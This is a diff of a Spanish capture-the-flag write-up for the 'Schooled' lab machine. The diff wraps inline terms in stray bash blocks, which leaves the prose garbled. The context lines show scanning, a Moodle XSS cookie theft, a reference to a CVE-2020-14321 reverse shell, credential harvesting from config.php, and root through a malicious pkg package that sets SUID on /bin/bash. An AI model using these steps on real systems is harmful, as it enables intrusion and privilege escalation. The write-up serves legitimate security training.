@@ -57,15 +57,39 @@ nmap -sC -sV -p22,80,443 10.10.10.234 -oN targeted
 whatweb http://10.10.10.234
 ```
 
-Es un Apache 2.4.46 en un **FreeBSD** con PHP 7.4.15. Vemos un email `admission@schooled.htb`, añadmimos el dominio al `/etc/hosts`.
+Es un Apache 2.4.46 en un **FreeBSD** con PHP 7.4.15. Vemos un email 
+```bash
+ admission@schooled.htb 
+```
+, añadmimos el dominio al 
+```bash
+ /etc/hosts 
+```
+.
 
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.234` o `http://schooled.htb` vemos lo mismo. El wappalizer no nos muestra nada interessante.
+Si entramos en la url 
+```bash
+ http://10.10.10.234 
+```
+ o 
+```bash
+ http://schooled.htb 
+```
+ vemos lo mismo. El wappalizer no nos muestra nada interessante.
 No vemos commentarios interessante en el codigo fuente. Si pinchamos al link **About**, vemos que la pagina se carga con una animacion.
 Investigamos lo que ocure al lado del servidor con **BurpSuite** pero no vemos nada.
-En la pagina `http://10.10.10.234/about.html` vemos probables usuarios en el testimonials. En la pagina `http://10.10.10.234/teachers.html` 
+En la pagina 
+```bash
+ http://10.10.10.234/about.html 
+```
+ vemos probables usuarios en el testimonials. En la pagina 
+```bash
+ http://10.10.10.234/teachers.html 
+```
+ 
 vemos mas usuarios potenciales. Decidimos crear un diccionario con estos usuarios por si acaso.
 
 ```bash
@@ -108,7 +132,15 @@ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-me
 wfuzz -c -t 200 --hc=404 --hl=461 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.shooled.htb http:10.10.10.234
 ```
 
-Encontramos un subdominio `moodle.schooled.htb`, lo añadmimos al `/etc/hosts`.
+Encontramos un subdominio 
+```bash
+ moodle.schooled.htb 
+```
+, lo añadmimos al 
+```bash
+ /etc/hosts 
+```
+.
 
 
 
@@ -118,11 +150,27 @@ Encontramos un subdominio `moodle.schooled.htb`, lo añadmimos al `/etc/hosts`.
 
 ### Moodle {-}
 
-Por la url `http://moodle.schooled.htb` vemos usuarios que ya tenemos en nuestro diccionario. Vemos que para ver los recursos, nos tenemos que
+Por la url 
+```bash
+ http://moodle.schooled.htb 
+```
+ vemos usuarios que ya tenemos en nuestro diccionario. Vemos que para ver los recursos, nos tenemos que
 loggear. Hay la posibilidad de loggearnos como guest o de crear un nuevo usuario. 
 
-Empezamos por crear un usuario. Vemos durante esta fase que necessitamos un email de typo `@student.schooled.htb`, lo añadmimos en el `/etc/hosts`.
-pero la web por `http://student.schooled.htb` no cambia.
+Empezamos por crear un usuario. Vemos durante esta fase que necessitamos un email de typo 
+```bash
+ @student.schooled.htb 
+```
+, lo añadmimos en el 
+```bash
+ /etc/hosts 
+```
+.
+pero la web por 
+```bash
+ http://student.schooled.htb 
+```
+ no cambia.
 
 Vemos que estamos registrados como estudiante y tenemos acceso al curso **Mathematics**. Le damos al boton **enroll** para suscribirnos al curso.
 Encontramos mensajes de profesores que nos dice que tenemos que tener el profile de MoodelNet para podernos suscribir al curso. 
@@ -158,7 +206,11 @@ Esperamos un poco y vemos que una peticion a sido lanzada y vemos una cookie de 
 
 ![Schooled-moodleet-xss](/assets/images/Schooled-moodlenet-xss.png) 
 Cambiamos la cookie desde firefox y recargamos la pagina. Ya vemos que nos hemos convertido en Manuel Philips.
-Buscando por internet con busquedas de typo `moodle professor role rce github`, vemos que existe un CVE 2020-14321.
+Buscando por internet con busquedas de typo 
+```bash
+ moodle professor role rce github 
+```
+, vemos que existe un CVE 2020-14321.
 
 Encontramos un exploit y lo utilizamos para crear una reverse shell.
 ## Vuln exploit & Gaining Access {-}
@@ -192,7 +244,11 @@ ls -l
 cat config.php
 ```
 
-Vemos un `config.php` con credenciales para mysql. 
+Vemos un 
+```bash
+ config.php 
+```
+ con credenciales para mysql. 
 
 ```bash
 which mysql
@@ -249,7 +305,11 @@ cat /etc/os-release
 sudo -l
 ```
 
-Aqui vemos que podemos lanzar el binario `/usr/sbin/pkg install *` como cualquier usuario sin proporcionar contraseña.
+Aqui vemos que podemos lanzar el binario 
+```bash
+ /usr/sbin/pkg install * 
+```
+ como cualquier usuario sin proporcionar contraseña.
 Buscando por [gtfobins](https://gtfobins.github.io/gtfobins/pkg/#sudo) vemos que podemos convertirnos en root con el comando
 
 ```bash
@@ -260,7 +320,11 @@ fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 sudo pkg install -y --no-repo-update ./x-1.0.txz
 ```
 
-En este caso no funcciona porque la maquina victima no tiene **fpm** instalado. Vemos que este comando solo crea un `.txz`. Lo hacemos desde nuestra maquina
+En este caso no funcciona porque la maquina victima no tiene **fpm** instalado. Vemos que este comando solo crea un 
+```bash
+ .txz 
+```
+. Lo hacemos desde nuestra maquina
 de atacante
 
 ```bash
@@ -274,7 +338,11 @@ echo 'chmod u+s /bin/bash' > $TF/x.sh
 fpm -n x -s dir -t freebsd -a all --before-install $TF/x.sh $TF
 ```
 
-Aqui ya tenemos el `.txz` en nuestra maquina de atacante. Lo transferimos a la maquina victima
+Aqui ya tenemos el 
+```bash
+ .txz 
+```
+ en nuestra maquina de atacante. Lo transferimos a la maquina victima
 
 1. Desde la maquina de atacante
 
